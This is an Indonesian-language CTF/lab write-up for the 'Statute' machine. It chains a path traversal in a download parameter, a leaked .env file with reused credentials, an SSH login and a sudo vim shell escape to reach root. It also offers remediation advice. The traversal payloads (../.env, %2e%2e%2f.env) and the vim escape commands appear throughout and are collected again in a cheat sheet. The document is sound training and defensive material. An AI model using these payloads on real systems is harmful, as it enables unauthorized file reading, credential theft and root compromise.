# 04 — Write-Up Lab Statute
## Path Traversal → Kebocoran `.env` → SSH Foothold → `sudo vim` → Root

> **Ruang lingkup:** hanya untuk laboratorium, CTF, atau pengujian keamanan yang telah memperoleh izin tertulis.  
> **Tujuan dokumen:** menggabungkan versi pembahasan detail dan versi close book agar mudah dipelajari sekaligus cepat digunakan saat ujian.

---

## Daftar Isi

1. Ringkasan eksekutif  
2. Data penting lab  
3. Rantai serangan  
4. Reconnaissance  
5. Menemukan endpoint download  
6. Memahami request normal dan baseline  
7. Eksploitasi Path Traversal  
8. Analisis file `.env`  
9. SSH foothold sebagai `operator`  
10. Enumerasi sudo  
11. Privilege escalation melalui Vim  
12. Pencarian flag  
13. Evidence yang perlu dikumpulkan  
14. Analisis temuan dan rekomendasi  
15. Troubleshooting  
16. Versi close book  
17. Cheat sheet singkat  
18. Ringkasan hafalan

---

# 1. Ringkasan Eksekutif

Aplikasi Statute pada port `8080` menyediakan fitur pengunduhan dokumen melalui parameter `file`. Aplikasi tidak membatasi lokasi file secara aman sehingga input seperti `../.env` dapat keluar dari direktori dokumen dan membaca file konfigurasi aplikasi.

File `.env` berisi kredensial akun `operator`. Kredensial tersebut dapat digunakan untuk login melalui SSH. Setelah memperoleh shell lokal, perintah `sudo -l` menunjukkan bahwa user `operator` diizinkan menjalankan `/usr/bin/vim` sebagai root. Karena Vim memiliki fitur shell escape, izin tersebut dapat disalahgunakan untuk membuka shell dengan hak root.

```text
Recon
→ temukan /download?file=
→ baseline file valid dan invalid
→ Path Traversal ke ../.env
→ temukan DB_USERNAME dan DB_PASSWORD
→ credential reuse ke SSH
→ sudo -l
→ sudo vim
→ shell escape
→ root
→ cari flag
```

---

# 2. Data Penting Lab

| Item | Nilai |
|---|---|
| Target | `192.168.56.120` |
| Web | `http://192.168.56.120:8080` |
| SSH | `192.168.56.120:22` |
| Endpoint penting | `/download?file=` |
| Parameter rentan | `file` |
| File sensitif | `../.env` |
| User SSH | `operator` |
| Password | nilai `DB_PASSWORD` dari `.env` |
| User awal | `operator` |
| Privilege escalation | `sudo /usr/bin/vim` |
| Pencarian flag | `find / -type f -iname "*flag*" 2>/dev/null` |

---

# 3. Rantai Serangan

```text
1. Nmap menemukan SSH pada port 22 dan web pada port 8080
2. Enumerasi aplikasi menemukan fungsi download
3. Request normal menunjukkan parameter file dikontrol pengguna
4. Baseline membedakan file valid dan file yang tidak ada
5. Payload ../.env membaca file di luar direktori dokumen
6. .env membocorkan username dan password
7. Credential digunakan untuk SSH sebagai operator
8. sudo -l menunjukkan operator dapat menjalankan Vim sebagai root
9. Vim menjalankan /bin/sh melalui shell escape
10. Shell berjalan dengan UID 0
11. Flag dicari dan dibaca
```

---

# 4. Reconnaissance

## 4.1 Menentukan Target

```bash
TARGET="192.168.56.120"
WEB="http://192.168.56.120:8080"
```

## 4.2 Memindai Port dan Service

```bash
nmap -Pn -sC -sV -p22,80,8080 "$TARGET"
```

### Evidence yang Diharapkan

```text
22/tcp   open  ssh
8080/tcp open  http
```

### Interpretasi

- Port `8080` menjadi permukaan serangan aplikasi web.
- Port `22` berpotensi digunakan setelah kredensial ditemukan.
- Pada tahap ini belum ada alasan untuk melakukan brute force SSH.

---

# 5. Menemukan Endpoint Download

## 5.1 Enumerasi Direktori

```bash
dirsearch \
  -u "$WEB" \
  -e php,html,txt,bak,env
```

Alternatif:

```bash
feroxbuster \
  -u "$WEB" \
  -x php,html,txt,bak,env
```

### Hasil yang Mungkin Ditemukan

```text
/download
/download.php
/documents
```

## 5.2 Identifikasi dari Antarmuka

Selain directory enumeration, buka aplikasi melalui browser dan periksa:

- tombol **Download**;
- tautan menuju dokumen;
- parameter pada address bar;
- request di Burp Suite atau Developer Tools.

Contoh request:

```http
GET /download?file=uu-1-2024.pdf HTTP/1.1
Host: 192.168.56.120:8080
```

Parameter yang dikontrol pengguna:

```text
file
```

---

# 6. Memahami Request Normal dan Baseline

Baseline membantu membedakan respons normal, error, dan traversal yang berhasil.

## 6.1 File Valid

```bash
curl -i \
  "$WEB/download?file=uu-1-2024.pdf"
```

### Contoh Response

```text
HTTP/1.1 200 OK
Content-Type: application/pdf
```

Simpan response untuk perbandingan:

```bash
curl -sS \
  -D valid.headers \
  -o valid.body \
  "$WEB/download?file=uu-1-2024.pdf"
```

## 6.2 File Tidak Ada

```bash
curl -i \
  "$WEB/download?file=missing.pdf"
```

### Contoh Response

```text
HTTP/1.1 404 Not Found
```

Simpan response:

```bash
curl -sS \
  -D missing.headers \
  -o missing.body \
  "$WEB/download?file=missing.pdf"
```

## 6.3 Bandingkan

```bash
wc -c valid.body missing.body
diff -u missing.headers valid.headers
```

### Tujuan Baseline

```text
File valid      → respons sukses dan isi dokumen
File tidak ada  → respons error
Traversal sukses→ respons sukses tetapi isi file sensitif
```

---

# 7. Eksploitasi Path Traversal

## 7.1 Payload Dasar

```bash
curl -i \
  -H 'User-Agent: Mozilla/5.0' \
  "$WEB/download?file=../.env"
```

Versi ringkas:

```bash
curl -s \
  -H 'User-Agent: Mozilla/5.0' \
  "$WEB/download?file=../.env"
```

## 7.2 Versi URL-Encoded

Apabila karakter traversal difilter:

```bash
curl -s \
  -H 'User-Agent: Mozilla/5.0' \
  "$WEB/download?file=%2e%2e%2f.env"
```

Variasi terbatas yang dapat diuji dalam scope lab:

```text
../.env
../../.env
%2e%2e%2f.env
..%2f.env
```

Jangan melakukan fuzzing kedalaman tanpa batas. Uji hanya sejauh yang diperlukan untuk membuktikan dampak.

## 7.3 Menggunakan `--path-as-is`

```bash
curl --path-as-is -i \
  -H 'User-Agent: Mozilla/5.0' \
  "$WEB/download?file=../.env"
```

`--path-as-is` mencegah normalisasi segmen traversal pada komponen path URL. Pada kasus Statute, payload berada pada **query parameter**, sehingga hal terpenting adalah memastikan nilai parameter dikirim utuh atau di-URL-encode. Opsi ini tetap aman digunakan agar request tidak diubah oleh client.

## 7.4 Evidence yang Diharapkan

```text
HTTP/1.1 200 OK
Content-Disposition: attachment; filename=".env"

DB_USERNAME=operator
DB_PASSWORD=<PASSWORD_DARI_ENV>
DB_DATABASE=jdih
```

## 7.5 Mengapa Payload Berhasil?

Misalkan server menyusun path seperti berikut:

```text
/var/www/app/documents/ + <input file>
```

Input normal:

```text
uu-1-2024.pdf
```

menjadi:

```text
/var/www/app/documents/uu-1-2024.pdf
```

Input traversal:

```text
../.env
```

menjadi:

```text
/var/www/app/documents/../.env
```

Setelah resolusi path:

```text
/var/www/app/.env
```

Aplikasi akhirnya membaca file di luar direktori yang seharusnya.

---

# 8. Analisis File `.env`

## 8.1 Simpan Hasil dengan Aman

```bash
curl -s \
  -H 'User-Agent: Mozilla/5.0' \
  "$WEB/download?file=../.env" \
  -o statute.env
```

## 8.2 Tampilkan Variabel Relevan

```bash
grep -E '^(DB_USERNAME|DB_PASSWORD|DB_DATABASE)=' statute.env
```

### Evidence

```text
DB_USERNAME=operator
DB_PASSWORD=<PASSWORD_DARI_ENV>
DB_DATABASE=jdih
```

## 8.3 Interpretasi

File `.env` biasanya menyimpan konfigurasi runtime, misalnya:

- kredensial database;
- token aplikasi;
- API key;
- secret session;
- alamat service internal.

Dalam lab ini, `DB_USERNAME` dan `DB_PASSWORD` ternyata juga valid sebagai kredensial sistem operasi. Hal ini menunjukkan **credential reuse**.

> Jangan menampilkan password sensitif secara penuh pada laporan produksi. Masking dapat digunakan, misalnya `Oper********`.

---

# 9. SSH Foothold sebagai `operator`

## 9.1 Login SSH

```bash
ssh operator@"$TARGET"
```

Masukkan password dari:

```text
DB_PASSWORD=<PASSWORD_DARI_ENV>
```

## 9.2 Validasi Konteks User

```bash
whoami
id
hostname
pwd
```

### Evidence yang Diharapkan

```text
operator
uid=1001(operator) gid=1001(operator)
statute
/home/operator
```

## 9.3 Interpretasi

- Foothold lokal berhasil.
- Kredensial dari aplikasi digunakan kembali pada SSH.
- Tahap berikutnya adalah enumerasi privilege, bukan langsung menjalankan exploit acak.

---

# 10. Enumerasi Sudo

## 10.1 Periksa Hak Sudo

```bash
sudo -l
```

### Evidence yang Mungkin Muncul

```text
(root) /usr/bin/vim
```

atau:

```text
(root) NOPASSWD: /usr/bin/vim
```

## 10.2 Interpretasi

Vim bukan hanya editor teks. Vim dapat:

- menjalankan command shell;
- membuka subshell;
- membaca dan menulis file;
- menjalankan program eksternal.

Apabila Vim dijalankan melalui `sudo`, semua fitur tersebut berjalan dalam konteks root.

## 10.3 Verifikasi Path Binary

```bash
command -v vim
ls -l /usr/bin/vim
```

Gunakan path yang sama persis seperti yang ditampilkan oleh `sudo -l`.

---

# 11. Privilege Escalation melalui Vim

## 11.1 Cara Cepat

```bash
sudo /usr/bin/vim -c ':!/bin/sh'
```

Pada beberapa konfigurasi, command sumber juga dapat ditulis:

```bash
sudo vim -c ':!/bin/sh'
```

## 11.2 Validasi Shell

Di shell yang terbuka:

```bash
whoami
id
```

### Expected

```text
root
uid=0(root) gid=0(root)
```

## 11.3 Cara Interaktif

```bash
sudo /usr/bin/vim
```

Di dalam Vim:

```vim
:!/bin/bash
```

Validasi:

```bash
whoami
id
```

Keluar dari shell:

```bash
exit
```

Keluar dari Vim:

```vim
:q!
```

## 11.4 Alternatif Shell Command Vim

Apabila command pertama tidak berjalan sesuai harapan:

```bash
sudo /usr/bin/vim -c ':set shell=/bin/sh' -c ':shell'
```

Atau secara interaktif:

```vim
:set shell=/bin/bash
:shell
```

## 11.5 Mengapa Ini Menjadi Root?

```text
sudo menjalankan Vim sebagai root
→ Vim mengizinkan eksekusi program eksternal
→ /bin/sh dibuat oleh proses Vim
→ shell mewarisi hak root
```

Izin sudo terhadap aplikasi interaktif yang mendukung shell escape pada dasarnya setara dengan memberikan shell root.

---

# 12. Pencarian Flag

## 12.1 Cari File Flag

```bash
find / -type f -iname "*flag*" 2>/dev/null
```

Catat semua path yang relevan.

## 12.2 Baca Flag

```bash
cat /PATH/FLAG
```

Contoh:

```bash
cat /root/flag.txt
```

## 12.3 Validasi Root Sebelum Membaca

```bash
whoami
id
```

Pastikan output menunjukkan:

```text
root
uid=0(root)
```

---

# 13. Evidence yang Perlu Dikumpulkan

| Tahap | Evidence minimum |
|---|---|
| Recon | Port `22` dan `8080` terbuka |
| Endpoint | Request `/download?file=...` |
| Baseline | Respons file valid dan file tidak ada |
| Traversal | Request `../.env` dan status `200` |
| Sensitive data | Variabel relevan dari `.env`, dengan password dimasking |
| SSH foothold | Output `whoami`, `id`, `hostname` |
| Sudo | Output `sudo -l` |
| Privesc | Command `sudo /usr/bin/vim ...` |
| Root proof | Output `whoami` dan `id` |
| Objective | Path flag dan bukti pembacaan sesuai scope |

Dokumentasikan waktu pengujian, target, endpoint, parameter, dan konteks user saat evidence diperoleh.

---

# 14. Analisis Temuan dan Rekomendasi

## 14.1 Temuan 1 — Path Traversal pada Parameter `file`

**Lokasi**

```text
GET /download?file=<filename>
Parameter: file
```

**Akar masalah**

Aplikasi menggabungkan input pengguna dengan path filesystem tanpa melakukan canonicalization dan validasi terhadap direktori tujuan.

**Dampak**

- pembacaan file konfigurasi;
- kebocoran kredensial;
- kebocoran source code;
- kebocoran private key atau token;
- perluasan serangan menuju sistem operasi.

**Rekomendasi**

- Jangan menerima nama path langsung dari pengguna.
- Gunakan ID dokumen yang dipetakan ke file pada server.
- Lakukan canonicalization menggunakan fungsi platform yang aman.
- Pastikan hasil canonical path tetap berada di direktori yang diizinkan.
- Terapkan allowlist nama file.
- Tolak karakter traversal, separator alternatif, dan encoding ganda.
- Jalankan aplikasi dengan akun filesystem berprivilege minimum.
- Simpan file sensitif di luar web root dan di luar jangkauan proses download.

Contoh logika aman secara konseptual:

```text
requested ID
→ lookup metadata server-side
→ resolve canonical path
→ verify path begins with allowed directory
→ serve file
```

## 14.2 Temuan 2 — Sensitive Information Disclosure pada `.env`

**Akar masalah**

File konfigurasi berisi secret dalam plaintext dan dapat dibaca oleh proses aplikasi.

**Dampak**

Kredensial dapat digunakan untuk mengakses database atau service lain.

**Rekomendasi**

- Gunakan secret manager atau vault.
- Batasi permission file `.env`.
- Pisahkan secret per environment.
- Rotasi semua credential yang telah terekspos.
- Hindari memasukkan `.env` ke image, repository, atau folder aplikasi yang dapat dibaca fitur download.
- Masking secret pada log dan laporan.

## 14.3 Temuan 3 — Credential Reuse antara Aplikasi dan SSH

**Akar masalah**

Username/password yang digunakan aplikasi juga valid sebagai akun OS.

**Dampak**

Kebocoran satu secret aplikasi berubah menjadi remote shell.

**Rekomendasi**

- Pisahkan akun aplikasi, database, dan sistem operasi.
- Gunakan password unik untuk setiap service.
- Gunakan SSH key, bukan password, untuk akun administratif.
- Batasi SSH berdasarkan jaringan asal.
- Nonaktifkan login password bila tidak diperlukan.
- Terapkan rotasi kredensial dan MFA bila tersedia.

## 14.4 Temuan 4 — Sudo Misconfiguration pada Vim

**Akar masalah**

User `operator` diperbolehkan menjalankan program interaktif yang mendukung shell escape sebagai root.

**Dampak**

Privilege escalation langsung hingga root.

**Rekomendasi**

- Hapus izin sudo untuk Vim.
- Jangan memberikan sudo terhadap editor, pager, interpreter, atau utilitas yang dapat menjalankan program eksternal.
- Bila editing file tertentu diperlukan, gunakan mekanisme terkontrol seperti:
  - `sudoedit` dengan path file spesifik;
  - wrapper terbatas;
  - automation yang tidak menerima input command;
  - konfigurasi sudoers dengan command dan argument yang ketat.
- Audit sudoers secara berkala.
- Bandingkan daftar command sudo dengan referensi teknik escape seperti GTFOBins.

## 14.5 Attack Chain

```text
Path Traversal
+ .env disclosure
+ credential reuse
+ sudo misconfiguration
= full root compromise
```

Risiko keseluruhan lebih tinggi daripada penilaian setiap celah secara terpisah karena seluruh kelemahan dapat dirangkai.

---

# 15. Troubleshooting

| Masalah | Kemungkinan penyebab | Solusi |
|---|---|---|
| Tidak menemukan endpoint download | Hanya mengandalkan directory brute force | Klik fitur download dan periksa Burp/DevTools |
| Tidak tahu nama parameter | Request normal belum dianalisis | Cari `file=`, `path=`, `document=`, atau parameter serupa |
| `.env` menghasilkan 404 | Kedalaman traversal tidak tepat | Uji `../.env`, lalu `../../.env` secara terbatas |
| `.env` menghasilkan 403 | Filter request atau WAF | Samakan header browser dan gunakan URL encoding |
| Response kosong | File di-download sebagai attachment | Gunakan `-o` lalu baca file hasil download |
| Curl mengubah payload | Normalisasi atau encoding | Gunakan URL encoding dan `--path-as-is` |
| SSH gagal | Password salah salin atau credential tidak digunakan ulang | Salin nilai persis, cek port 22, gunakan `ssh -vvv` |
| `sudo -l` meminta password | Konfigurasi bukan NOPASSWD | Masukkan password akun `operator` |
| `sudo vim` ditolak | Path binary tidak sama dengan sudoers | Gunakan `/usr/bin/vim` persis seperti output `sudo -l` |
| Shell escape tidak terbuka | Mode Vim atau command tidak tepat | Gunakan `:set shell=/bin/sh` lalu `:shell` |
| Shell bukan root | Vim tidak dijalankan melalui sudo | Validasi command dan ulang `sudo -l` |

---

# 16. Versi Close Book

## 16.1 Set Target

```bash
TARGET="192.168.56.120"
WEB="http://192.168.56.120:8080"
```

## 16.2 Ambil `.env`

```bash
curl -s \
  -H 'User-Agent: Mozilla/5.0' \
  "$WEB/download?file=../.env"
```

Alternatif encoded:

```bash
curl -s \
  -H 'User-Agent: Mozilla/5.0' \
  "$WEB/download?file=%2e%2e%2f.env"
```

Expected:

```text
DB_USERNAME=operator
DB_PASSWORD=<PASSWORD_DARI_ENV>
```

## 16.3 SSH

```bash
ssh operator@"$TARGET"
```

Masukkan password dari `DB_PASSWORD`.

Validasi:

```bash
whoami
id
hostname
```

## 16.4 Cek Sudo

```bash
sudo -l
```

Expected:

```text
(root) /usr/bin/vim
```

## 16.5 Root

```bash
sudo /usr/bin/vim -c ':!/bin/sh'
```

Validasi:

```bash
whoami
id
```

## 16.6 Cari Flag

```bash
find / -type f -iname "*flag*" 2>/dev/null
cat /PATH/FLAG
```

---

# 17. Cheat Sheet Singkat

```bash
TARGET="192.168.56.120"
WEB="http://192.168.56.120:8080"

curl -s \
  -H 'User-Agent: Mozilla/5.0' \
  "$WEB/download?file=../.env"

ssh operator@"$TARGET"
# password dari DB_PASSWORD

sudo -l
sudo /usr/bin/vim -c ':!/bin/sh'

whoami
id
find / -type f -iname "*flag*" 2>/dev/null
cat /PATH/FLAG
```

Alternatif Vim:

```bash
sudo /usr/bin/vim -c ':set shell=/bin/sh' -c ':shell'
```

---

# 18. Ringkasan Hafalan

```text
Nmap 22,8080
→ temukan /download
→ lihat request normal
→ parameter file
→ baseline valid dan invalid
→ ../.env
→ DB_USERNAME operator
→ DB_PASSWORD
→ SSH operator
→ sudo -l
→ /usr/bin/vim
→ sudo vim shell escape
→ root
→ find flag
```

## Rumus Ingatan

```text
DOWNLOAD → ENV → SSH → SUDO → VIM → ROOT
```
